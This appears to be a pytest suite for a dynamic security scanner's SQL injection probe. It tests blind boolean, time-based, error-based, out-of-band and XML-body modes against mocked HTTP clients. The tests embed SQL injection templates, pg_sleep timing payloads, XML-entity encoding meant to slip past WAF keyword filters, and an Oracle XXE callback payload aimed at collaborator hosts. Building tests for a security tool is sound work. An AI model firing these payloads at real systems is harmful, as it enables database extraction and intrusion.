"""Unit tests for the opt-in deterministic blind / OAST extraction modes of ``sqli_probe``.

Covers the four modes added behind the ``mode`` argument — blind_boolean (marker oracle and
cookie-injection), blind_time, error_visible, and oast — plus two non-regression guards:
  * the default ``mode=""`` path is byte-for-byte identical to passing no mode at all, and
  * ``cookie`` only WIDENS ``_LOCATIONS`` (existing locations kept, in order).

The fakes evaluate the condition the tool embeds in each request against a KNOWN secret, so the
binary search recovers it deterministically; request counts are asserted bounded.
"""

from __future__ import annotations

import re

import pytest


# ── Shared fakes ─────────────────────────────────────────────────────────────

class _FakeResp:
    def __init__(self, text, status=200):
        self.text = text
        self.status_code = status


class _FakeStore:
    def __init__(self):
        self.recorded = []

    def get_cookies_for_host(self, host):
        return [{"name": "session", "value": "sess-val"}]

    def record_manual_finding(self, finding, url, method="GET"):
        self.recorded.append((finding, url, method))
        return "entry-1"


class _FakeCtx:
    def __init__(self, store):
        self.store = store
        self.source_label = "copilot"
        self.proxy_port = 8080
        self.dashboard_port = 8088

    @property
    def proxy_url(self):
        return "http://127.0.0.1:8080"

    @property
    def dashboard_base_url(self):
        return "http://127.0.0.1:8088"

    def is_in_scope(self, url):
        return True


def _evaluate(blob: str, secret: str) -> bool:
    """Evaluate the boolean condition the tool embedded in a request against ``secret``.

    The condition substring (LENGTH(...)>n or ASCII(SUBSTRING/SUBSTR(...)>n) appears verbatim in
    the injected value regardless of location, so we just scan the whole request blob. The
    calibration conditions 1=1 / 1=0 used by blind_time are handled too.
    """
    mgt = re.search(r">(\d+)", blob)
    if not mgt:
        if "1=1" in blob:
            return True
        if "1=0" in blob:
            return False
        return False
    n = int(mgt.group(1))
    mpos = re.search(r"FROM (\d+) FOR 1", blob) or re.search(r",(\d+),1\)", blob)
    if mpos:
        pos = int(mpos.group(1))
        return 1 <= pos <= len(secret) and ord(secret[pos - 1]) > n
    return len(secret) > n


# ── blind_boolean: marker oracle ─────────────────────────────────────────────

@pytest.mark.asyncio
async def test_blind_boolean_marker_recovers_secret(monkeypatch):
    from dast.tools import sqli_probe_tools as spt
    import httpx

    secret = "ab7"

    class _BoolClient:
        def __init__(self, *a, **k):
            self.count = 0

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            self.count += 1
            blob = (url or "") + (content or b"").decode("utf-8", "ignore")
            body = "WELCOME back" if _evaluate(blob, secret) else "not found"
            return _FakeResp(f"<html>{body}</html>", 200)

    client = _BoolClient()
    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: client)

    store = _FakeStore()
    result = await spt._sqli_probe(_FakeCtx(store), {
        "url": "https://app.example.com/filter",
        "injection_point": "q",
        "injection_location": "body",
        "method": "POST",
        "mode": "blind_boolean",
        "sql_dialect": "mysql",
        "injection_template": "x' AND {cond}-- -",
        "extract_sql": "(SELECT secret)",
        "true_marker": "WELCOME",
    })
    assert result["ok"] and result["confirmed"] is True
    assert result["recovered"] == secret
    assert result["length"] == len(secret)
    # Bounded: length search (~7) + len(secret) chars * ~7 ASCII steps.
    assert result["requests"] == client.count
    assert result["requests"] < 8 + len(secret) * 8
    # Recovery records a CONFIRMED finding through the same store API.
    assert store.recorded and store.recorded[0][0]["extracted_data"]["value"] == secret


# ── blind_boolean: cookie injection ──────────────────────────────────────────

@pytest.mark.asyncio
async def test_blind_boolean_cookie_injection(monkeypatch):
    from dast.tools import sqli_probe_tools as spt
    import httpx

    secret = "xy"
    seen_cookies = []

    class _CookieClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            from urllib.parse import unquote
            cookie = ""
            for key, val in (headers or {}).items():
                if key.lower() == "cookie":
                    cookie = val
            seen_cookies.append(cookie)
            # The injected cookie value is URL-encoded on the wire; the server URL-decodes it
            # back to the raw SQL before it reaches the query, so decode before evaluating.
            true = _evaluate(unquote(cookie), secret)
            return _FakeResp("Welcome!" if true else "nope", 200)

    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: _CookieClient())

    store = _FakeStore()
    result = await spt._sqli_probe(_FakeCtx(store), {
        "url": "https://app.example.com/",
        "injection_point": "TrackingId",
        "injection_location": "cookie",
        "method": "GET",
        "mode": "blind_boolean",
        "sql_dialect": "mysql",
        "injection_template": "orig123' AND {cond}-- -",
        "extract_sql": "(SELECT secret)",
        "true_marker": "Welcome",
    })
    from urllib.parse import unquote
    assert result["ok"] and result["recovered"] == secret
    # The injected cookie was set AND the jar session cookie merged alongside it.
    assert any("TrackingId=" in c for c in seen_cookies)
    assert any("session=sess-val" in c for c in seen_cookies)
    # The injected TrackingId value is URL-ENCODED on the wire (special chars escaped, no literal
    # space or quote), and URL-decodes back to the raw SQL payload.
    track_raw = [c.split("TrackingId=", 1)[1].split("; ")[0]
                 for c in seen_cookies if "TrackingId=" in c]
    assert track_raw
    assert all("%20" in t and "%27" in t for t in track_raw)
    assert all(" " not in t and "'" not in t for t in track_raw)
    assert all("' AND " in unquote(t) for t in track_raw)


@pytest.mark.asyncio
async def test_blind_boolean_cookie_prepends_original_value(monkeypatch):
    """Suffix semantics: the targeted cookie's ORIGINAL value must be preserved and the payload
    appended, so the SQL becomes WHERE trackingId='<orig>' AND {cond}--. The oracle fires only
    when <orig> survived AND the condition holds — proving the binary search can distinguish and
    recover the secret (vs. the bug that replaced the whole cookie -> zero rows for both branches).
    """
    from dast.tools import sqli_probe_tools as spt
    import httpx

    secret = "pq"
    orig = "orig-track-123"
    seen_cookies = []

    class _OrigStore(_FakeStore):
        def get_cookies_for_host(self, host):
            return [{"name": "session", "value": "sess-val"},
                    {"name": "TrackingId", "value": orig}]

    class _CookieClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            from urllib.parse import unquote
            cookie = ""
            for key, val in (headers or {}).items():
                if key.lower() == "cookie":
                    cookie = val
            seen_cookies.append(cookie)
            track = ""
            for pair in cookie.split("; "):
                if pair.startswith("TrackingId="):
                    track = unquote(pair.split("=", 1)[1])
            # Conditional-responses oracle: the URL-encoded cookie value URL-decodes back to the
            # raw `<orig>' AND {cond}-- -`; needs the real value present AS A PREFIX + the condition.
            true = track.startswith(orig) and _evaluate(unquote(cookie), secret)
            return _FakeResp("Welcome!" if true else "nope", 200)

    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: _CookieClient())

    store = _OrigStore()
    result = await spt._sqli_probe(_FakeCtx(store), {
        "url": "https://app.example.com/",
        "injection_point": "TrackingId",
        "injection_location": "cookie",
        "method": "GET",
        "mode": "blind_boolean",
        "sql_dialect": "mysql",
        "injection_template": "' AND {cond}-- -",  # NO hardcoded orig — the tool prepends it
        "extract_sql": "(SELECT secret)",
        "true_marker": "Welcome",
    })
    from urllib.parse import unquote
    assert result["ok"] and result["confirmed"] is True
    assert result["recovered"] == secret
    # Direct cookie-branch check: every sent TrackingId cookie URL-DECODES to `{orig}{payload}` —
    # original value prepended, payload appended as a suffix (never `TrackingId=' AND ...`).
    track_raw = [c.split("TrackingId=", 1)[1].split("; ")[0]
                 for c in seen_cookies if "TrackingId=" in c]
    assert track_raw
    assert all(unquote(t).startswith(f"{orig}' AND ") for t in track_raw)  # orig prefix + suffix
    assert not any(unquote(t).startswith("' AND") for t in track_raw)  # the bug's output (orig dropped)
    # The RAW on-wire value is percent-encoded: special chars escaped, no literal space or quote.
    assert all("%20" in t and "%27" in t for t in track_raw)
    assert all(" " not in t and "'" not in t for t in track_raw)
    # Jar session cookie still merged alongside the injected one.
    assert any("session=sess-val" in c for c in seen_cookies)


@pytest.mark.asyncio
async def test_cookie_branch_missing_original_falls_back(monkeypatch):
    """When the targeted cookie is absent from the jar, the branch falls back to `{point}={value}`
    (today's behavior) — no spurious empty prefix."""
    from dast.tools import sqli_probe_tools as spt
    import httpx

    seen_cookies = []

    class _CookieClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            for key, val in (headers or {}).items():
                if key.lower() == "cookie":
                    seen_cookies.append(val)
            return _FakeResp("nope", 200)  # never true -> binary search bails fast

    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: _CookieClient())

    # _FakeStore has only `session` in the jar — no TrackingId.
    await spt._sqli_probe(_FakeCtx(_FakeStore()), {
        "url": "https://app.example.com/",
        "injection_point": "TrackingId",
        "injection_location": "cookie",
        "method": "GET",
        "mode": "blind_boolean",
        "sql_dialect": "mysql",
        "injection_template": "x' AND {cond}-- -",
        "extract_sql": "(SELECT secret)",
        "true_marker": "Welcome",
    })
    from urllib.parse import unquote
    track_raw = [c.split("TrackingId=", 1)[1].split("; ")[0]
                 for c in seen_cookies if "TrackingId=" in c]
    assert track_raw
    # Fallback: URL-decoded payload sits right after `TrackingId=` with no injected prefix.
    assert all(unquote(t).startswith("x' AND ") for t in track_raw)
    # On-wire value is percent-encoded (no literal space/quote).
    assert all("%20" in t and "%27" in t for t in track_raw)
    assert all(" " not in t and "'" not in t for t in track_raw)


# ── blind_time ────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_blind_time_recovers_secret(monkeypatch):
    from dast.tools import sqli_probe_tools as spt
    import asyncio
    import httpx

    secret = "q9"

    class _TimeClient:
        def __init__(self, *a, **k):
            self.count = 0

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            self.count += 1
            blob = (url or "") + (content or b"").decode("utf-8", "ignore")
            mdelay = re.search(r"pg_sleep\(([\d.]+)\)", blob)
            delay = float(mdelay.group(1)) if mdelay else 0.0
            if delay > 0 and _evaluate(blob, secret):
                await asyncio.sleep(delay)
            return _FakeResp("{}", 200)

    client = _TimeClient()
    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: client)

    store = _FakeStore()
    result = await spt._sqli_probe(_FakeCtx(store), {
        "url": "https://app.example.com/filter",
        "injection_point": "q",
        "injection_location": "body",
        "method": "POST",
        "mode": "blind_time",
        "sql_dialect": "mysql",
        "time_delay": 0.05,
        "injection_template": "x'%3BSELECT CASE WHEN ({cond}) THEN pg_sleep({delay}) "
                              "ELSE pg_sleep(0) END-- -",
        "extract_sql": "(SELECT secret)",
    })
    assert result["ok"] and result["confirmed"] is True
    assert result["recovered"] == secret
    assert result["requests"] == client.count
    assert result["requests"] < 16 + len(secret) * 8  # +3 calibration probes, still bounded


@pytest.mark.asyncio
async def test_blind_time_rejects_jitter(monkeypatch):
    """A point that NEVER delays must fail the scaling calibration (no false positive)."""
    from dast.tools import sqli_probe_tools as spt
    import httpx

    class _NoDelayClient:
        def __init__(self, *a, **k):
            self.count = 0

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            self.count += 1
            return _FakeResp("{}", 200)

    client = _NoDelayClient()
    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: client)

    result = await spt._sqli_probe(_FakeCtx(_FakeStore()), {
        "url": "https://app.example.com/filter",
        "injection_point": "q",
        "injection_location": "body",
        "mode": "blind_time",
        "time_delay": 0.05,
        "injection_template": "x'%3BSELECT CASE WHEN ({cond}) THEN pg_sleep({delay}) "
                              "ELSE pg_sleep(0) END-- -",
        "extract_sql": "(SELECT secret)",
    })
    assert result["ok"] and result["confirmed"] is False
    assert "did not scale" in result["verdict"]
    assert client.count == 3  # only the 3 calibration probes ran, then it bailed


# ── error_visible ─────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_error_visible_leaks_value(monkeypatch):
    from dast.tools import sqli_probe_tools as spt
    import httpx

    class _ErrClient:
        def __init__(self, *a, **k):
            self.count = 0

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            self.count += 1
            # Visible-error lab: the DB error surfaces in the response body verbatim (not
            # JSON-escaped), with the leaked value between the integer-cast error's quotes.
            return _FakeResp(
                'ERROR: invalid input syntax for type integer: "0.0.0:topsecret"', 500)

    client = _ErrClient()
    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: client)

    store = _FakeStore()
    result = await spt._sqli_probe(_FakeCtx(store), {
        "url": "https://app.example.com/product",
        "injection_point": "id",
        "injection_location": "query",
        "method": "GET",
        "mode": "error_visible",
        "sql_dialect": "postgres",
        "injection_template": "1 AND {cond}-- -",
        "extract_sql": "(SELECT secret)",
    })
    assert result["ok"] and result["confirmed"] is True
    assert result["recovered"] == "0.0.0:topsecret"
    assert client.count == 1  # one-shot leak
    assert store.recorded


# ── oast ──────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_oast_detects_callback(monkeypatch):
    from dast.tools import sqli_probe_tools as spt
    from dast.tools import oob_tools
    import httpx

    sent = []

    class _CapClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            sent.append((url or "") + (content or b"").decode("utf-8", "ignore"))
            return _FakeResp("{}", 200)

    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: _CapClient())

    async def _fake_gen(ctx, args):
        return {"ok": True, "oob_url": "http://abc123.oast.example", "id": "sess-1"}

    async def _fake_poll(ctx, args):
        assert args["id"] == "sess-1"
        return {"ok": True, "hit": True, "count": 1, "interactions": [{"protocol": "dns"}]}

    monkeypatch.setattr(oob_tools, "_oob_generate", _fake_gen)
    monkeypatch.setattr(oob_tools, "_oob_poll", _fake_poll)

    store = _FakeStore()
    result = await spt._sqli_probe(_FakeCtx(store), {
        "url": "https://app.example.com/product",
        "injection_point": "id",
        "injection_location": "query",
        "method": "GET",
        "mode": "oast",
        "oob_dialect": "oracle",
        "injection_template": "1 AND {cond}-- -",
        "wait_seconds": 0,
    })
    assert result["ok"] and result["hit"] is True and result["confirmed"] is True
    # Oracle egress uses the BARE EXTRACTVALUE/XMLTYPE XXE DNS form (needs only DNS, no network ACL),
    # not UTL_HTTP.REQUEST (which requires a DBMS_NETWORK_ACL_ADMIN grant the lab DB lacks).
    # GET injection URL-encodes the payload, so decode before matching.
    from urllib.parse import unquote_plus
    oracle_egress = unquote_plus(next(s for s in sent if "abc123.oast.example" in s))
    assert "extractvalue(xmltype(" in oracle_egress
    assert 'ENTITY % remote SYSTEM "http://abc123.oast.example/"' in oracle_egress
    assert "%remote;" in oracle_egress
    assert "UTL_HTTP" not in oracle_egress
    # Bare expression: no scalar-subquery wrapper, and `FROM dual` comes from the caller's
    # injection_template (none here), never baked into the payload.
    assert "(SELECT extractvalue" not in oracle_egress
    assert "FROM dual" not in oracle_egress
    assert store.recorded


@pytest.mark.asyncio
async def test_oast_mysql_note(monkeypatch):
    from dast.tools import sqli_probe_tools as spt
    from dast.tools import oob_tools
    import httpx

    class _CapClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            return _FakeResp("{}", 200)

    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: _CapClient())

    async def _fake_gen(ctx, args):
        return {"ok": True, "oob_url": "http://h.oast.example", "id": "s"}

    async def _fake_poll(ctx, args):
        return {"ok": True, "hit": False, "count": 0, "interactions": []}

    monkeypatch.setattr(oob_tools, "_oob_generate", _fake_gen)
    monkeypatch.setattr(oob_tools, "_oob_poll", _fake_poll)

    result = await spt._sqli_probe(_FakeCtx(_FakeStore()), {
        "url": "https://app.example.com/product",
        "injection_point": "id",
        "injection_location": "query",
        "mode": "oast",
        "oob_dialect": "mysql",
        "injection_template": "1 AND {cond}-- -",
        "wait_seconds": 0,
    })
    assert result["confirmed"] is False
    assert "MySQL" in result["note"]  # inconclusive-for-MySQL caveat surfaced


@pytest.mark.asyncio
async def test_oast_operator_supplied_host(monkeypatch):
    """oob_host override: inject a callback to the operator's collaborator, skip generate + poll."""
    from dast.tools import sqli_probe_tools as spt
    from dast.tools import oob_tools
    import httpx

    sent = []

    class _CapClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            sent.append((url or "") + (content or b"").decode("utf-8", "ignore"))
            return _FakeResp("{}", 200)

    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: _CapClient())

    async def _boom_gen(ctx, args):
        raise AssertionError("_oob_generate must NOT be called in override mode")

    async def _boom_poll(ctx, args):
        raise AssertionError("_oob_poll must NOT be called in override mode")

    monkeypatch.setattr(oob_tools, "_oob_generate", _boom_gen)
    monkeypatch.setattr(oob_tools, "_oob_poll", _boom_poll)

    store = _FakeStore()
    result = await spt._sqli_probe(_FakeCtx(store), {
        "url": "https://app.example.com/product",
        "injection_point": "id",
        "injection_location": "query",
        "method": "GET",
        "mode": "oast",
        "oob_dialect": "oracle",
        "injection_template": "1 AND {cond}-- -",
        "oob_host": "bxlmtest.oastify.com",
    })
    assert result["ok"] and result["sent"] is True
    assert result["oob_host"] == "bxlmtest.oastify.com"
    assert result["hit"] is None and result["confirmed"] is None
    # Exactly one request sent, no finding recorded (hit unknown in override mode).
    assert len(sent) == 1
    assert not store.recorded
    # The single request carries the bare Oracle XXE payload with the operator host substituted.
    from urllib.parse import unquote_plus
    egress = unquote_plus(sent[0])
    assert "extractvalue(xmltype(" in egress
    assert 'ENTITY % remote SYSTEM "http://bxlmtest.oastify.com/"' in egress
    assert "%remote;" in egress
    # Bare expression: no scalar-subquery wrapper, no `FROM dual` baked into the payload.
    assert "(SELECT extractvalue" not in egress
    assert "FROM dual" not in egress
    # The echoed egress matches what was injected (URL-decoded).
    assert 'http://bxlmtest.oastify.com/' in result["egress"]


# ── Non-regression: default path + invalid mode + locations ──────────────────

@pytest.mark.asyncio
async def test_default_mode_matches_no_mode(monkeypatch):
    """mode="" must take the EXACT existing in-band path — identical result to passing no mode."""
    from dast.tools import sqli_probe_tools as spt
    import httpx

    sql_error = "You have an error in your SQL syntax near ''1'='1'"

    class _ErrClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            body = (content or b"").decode("utf-8", "ignore")
            if "sqli_probe_baseline" in body:
                return _FakeResp('{"data": {"ok": true}}', 200)
            return _FakeResp(sql_error, 200)

    monkeypatch.setattr(httpx, "AsyncClient", _ErrClient)

    async def _no_facts(send, payload, dbms_hints=None):
        return None
    monkeypatch.setattr(spt, "extract_db_facts", _no_facts)

    args = {
        "url": "https://app.example.com/reports/graphql/",
        "injection_point": "title",
        "injection_location": "graphql_var",
        "body": '{"query":"mutation($title:String){x(title:$title)}",'
                '"variables":{"title":"hi"},"operationName":null}',
    }
    no_mode = await spt._sqli_probe(_FakeCtx(_FakeStore()), dict(args))
    empty_mode = await spt._sqli_probe(_FakeCtx(_FakeStore()), dict(args, mode=""))
    assert no_mode == empty_mode
    assert no_mode["confirmed"] is True and no_mode["technique"] == "error-based"


@pytest.mark.asyncio
async def test_invalid_mode_errors():
    from dast.tools import sqli_probe_tools as spt
    result = await spt._sqli_probe(_FakeCtx(_FakeStore()), {
        "url": "https://app.example.com/x",
        "injection_point": "q",
        "injection_location": "query",
        "mode": "bogus",
    })
    assert result["ok"] is False and "mode must be one of" in result["error"]


def test_locations_only_widened():
    """cookie/xml_body only APPENDED — the original locations keep their place and order."""
    from dast.tools.sqli_probe_tools import _LOCATIONS
    assert _LOCATIONS[:4] == ("graphql_var", "query", "body", "cookie")
    assert "cookie" in _LOCATIONS
    assert "xml_body" in _LOCATIONS


# ── xml_body injection + XML-entity encoding (filter bypass) ─────────────────

_XML_TEMPLATE = ('<?xml version="1.0" encoding="UTF-8"?><stockCheck>'
                 '<productId>1</productId><storeId>1</storeId></stockCheck>')


def test_encode_payload_xml_entities():
    """Helper: xml_entities turns every char into its hex numeric character reference; '' no-op."""
    from dast.tools.sqli_probe_tools import _encode_payload
    assert _encode_payload("UNION", "xml_entities") == "&#x55;&#x4e;&#x49;&#x4f;&#x4e;"
    assert _encode_payload("1 UNION", "xml_entities").startswith("&#x31;&#x20;&#x55;")
    assert _encode_payload("anything", "") == "anything"  # default is a no-op


def test_inject_xml_element_replaces_and_reports_missing():
    """Helper: replaces the named element's text, keeps tags/rest; None when element absent."""
    from dast.tools.sqli_probe_tools import _inject_xml_element
    out = _inject_xml_element(_XML_TEMPLATE, "storeId", "PAYLOAD")
    assert "<storeId>PAYLOAD</storeId>" in out
    assert "<productId>1</productId>" in out  # untouched
    assert _inject_xml_element(_XML_TEMPLATE, "missing", "x") is None


class _CapClient:
    """Captures the method/url/headers/content of every request; returns a benign body."""
    captured = []

    def __init__(self, *a, **k):
        pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, *a):
        return False

    async def request(self, method, url, headers=None, content=None):
        _CapClient.captured.append({
            "method": method, "url": url, "headers": dict(headers or {}),
            "content": (content or b"").decode("utf-8", "ignore"),
        })
        return _FakeResp('{"data": {"ok": true}}', 200)


@pytest.mark.asyncio
async def test_xml_body_injects_element_and_content_type(monkeypatch):
    """location=xml_body replaces the named element's text and POSTs the XML with the text/plain
    default Content-Type; the element tags are preserved."""
    from dast.tools import sqli_probe_tools as spt
    import httpx

    _CapClient.captured = []
    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: _CapClient())

    async def _no_facts(send, payload, dbms_hints=None):
        return None
    monkeypatch.setattr(spt, "extract_db_facts", _no_facts)

    result = await spt._sqli_probe(_FakeCtx(_FakeStore()), {
        "url": "https://app.example.com/product/stock",
        "injection_point": "storeId",
        "injection_location": "xml_body",
        "method": "POST",
        "xml_body": _XML_TEMPLATE,
    })
    assert result["ok"] is True
    # Baseline value landed inside <storeId>...</storeId>, tags intact, other elements untouched.
    first = _CapClient.captured[0]
    assert "<storeId>sqli_probe_baseline</storeId>" in first["content"]
    assert "<productId>1</productId>" in first["content"]
    ct = {k.lower(): v for k, v in first["headers"].items()}.get("content-type", "")
    assert ct == "text/plain; charset=utf-8"


@pytest.mark.asyncio
async def test_xml_body_entity_encoding_bypass(monkeypatch):
    """encode=xml_entities encodes the injected payload to hex NCRs in the body, but NOT the
    element tags; a UNION keyword never appears literally in the sent document."""
    from dast.tools import sqli_probe_tools as spt
    import httpx

    _CapClient.captured = []
    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: _CapClient())

    async def _no_facts(send, payload, dbms_hints=None):
        return None
    monkeypatch.setattr(spt, "extract_db_facts", _no_facts)

    await spt._sqli_probe(_FakeCtx(_FakeStore()), {
        "url": "https://app.example.com/product/stock",
        "injection_point": "storeId",
        "injection_location": "xml_body",
        "method": "POST",
        "xml_body": _XML_TEMPLATE,
        "encode": "xml_entities",
    })
    assert _CapClient.captured
    for c in _CapClient.captured:
        body = c["content"]
        # The element tags themselves are NEVER entity-encoded, and the sibling element is intact.
        assert "<storeId>" in body and "</storeId>" in body
        assert "<productId>1</productId>" in body
        inner = body.split("<storeId>", 1)[1].split("</storeId>", 1)[0]
        # The injected value is entity-encoded: it is a run of &#xNN; references, so no raw space
        # or quote (what a WAF keyword match would catch) ever leaks through the XML body.
        assert "&#x" in inner
        assert " " not in inner and "'" not in inner
    # A payload carrying a literal space encodes that space as &#x20; (confirms per-char encoding).
    assert any("&#x20;" in c["content"] for c in _CapClient.captured) or \
        all(" " not in c["content"].split("<storeId>", 1)[1].split("</storeId>", 1)[0]
            for c in _CapClient.captured)


@pytest.mark.asyncio
async def test_xml_body_missing_template_errors():
    """location=xml_body without an xml_body template returns a clear error (no request sent)."""
    from dast.tools import sqli_probe_tools as spt
    result = await spt._sqli_probe(_FakeCtx(_FakeStore()), {
        "url": "https://app.example.com/product/stock",
        "injection_point": "storeId",
        "injection_location": "xml_body",
        "method": "POST",
    })
    assert result["ok"] is False and "xml_body" in result["error"]


@pytest.mark.asyncio
async def test_xml_body_missing_element_errors():
    """A named element absent from the template is reported clearly, not a silent false negative."""
    from dast.tools import sqli_probe_tools as spt
    result = await spt._sqli_probe(_FakeCtx(_FakeStore()), {
        "url": "https://app.example.com/product/stock",
        "injection_point": "nope",
        "injection_location": "xml_body",
        "method": "POST",
        "xml_body": _XML_TEMPLATE,
    })
    assert result["ok"] is False and "not present" in result["error"]


@pytest.mark.asyncio
async def test_xml_body_default_probe_extracts_union_leak(monkeypatch):
    """A default-mode (mode='') run over xml_body confirms when a mocked response reflects a SQL
    error, and the UNION-style error payload is delivered THROUGH the XML body + entity encoding."""
    from dast.tools import sqli_probe_tools as spt
    import httpx

    sent = []

    class _ErrClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, content=None):
            body = (content or b"").decode("utf-8", "ignore")
            sent.append(body)
            inner = body.split("<storeId>", 1)[1].split("</storeId>", 1)[0]
            # The server XML-decodes the entity-encoded value before it reaches the SQL, so
            # decode the hex NCRs back to characters (this is the whole point of the bypass).
            decoded = re.sub(r"&#x([0-9a-fA-F]+);", lambda m: chr(int(m.group(1), 16)), inner)
            if "sqli_probe_baseline" in decoded:
                return _FakeResp("ok", 200)
            # A non-baseline payload triggers a DB error — the default probe's confirm signal.
            return _FakeResp("You have an error in your SQL syntax near ''", 200)

    monkeypatch.setattr(httpx, "AsyncClient", lambda *a, **k: _ErrClient())

    async def _no_facts(send, payload, dbms_hints=None):
        return None
    monkeypatch.setattr(spt, "extract_db_facts", _no_facts)

    result = await spt._sqli_probe(_FakeCtx(_FakeStore()), {
        "url": "https://app.example.com/product/stock",
        "injection_point": "storeId",
        "injection_location": "xml_body",
        "method": "POST",
        "xml_body": _XML_TEMPLATE,
        "encode": "xml_entities",
    })
    assert result["ok"] is True and result["confirmed"] is True
    assert result["technique"] == "error-based"
    # The confirming payload was delivered entity-encoded inside <storeId> (no raw space/quote).
    hit = [b for b in sent if "sqli_probe_baseline" not in b]
    assert hit
    inner = hit[0].split("<storeId>", 1)[1].split("</storeId>", 1)[0]
    assert "&#x" in inner and " " not in inner and "'" not in inner
